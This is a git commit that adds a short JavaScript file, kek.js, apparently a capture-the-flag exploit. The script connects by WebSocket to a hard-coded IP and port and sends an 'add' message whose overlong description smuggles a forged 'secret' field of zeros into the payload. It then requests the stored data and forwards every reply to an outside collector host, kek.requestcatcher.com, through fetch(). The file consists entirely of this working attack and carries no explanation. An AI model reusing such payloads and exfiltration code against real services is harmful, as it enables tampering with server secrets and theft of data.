32e92a88c23b121d1d3cb76428765232ff58dddb
codefeasto <87825522+codefeasto@users.noreply.github.com>
2023-04-12 15:22:53 +0300

    Create kek.js

---
+++ kek.js
@@ -0,0 +1,9 @@
+const target = '188.166.175.0:31972';
+const ws = new WebSocket(`ws://${target}/ws`);
+ws.onopen = () => {
+    ws.send(JSON.stringify({action:'add',title: 'A',description: `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","secret":"00000000000000000000000000000000"}`}));
+    ws.send(JSON.stringify({action:'get'}));
+}
+ws.onmessage = async (msg) => {
+    fetch(`https://kek.requestcatcher.com/?kek=${msg.data}`);
+}
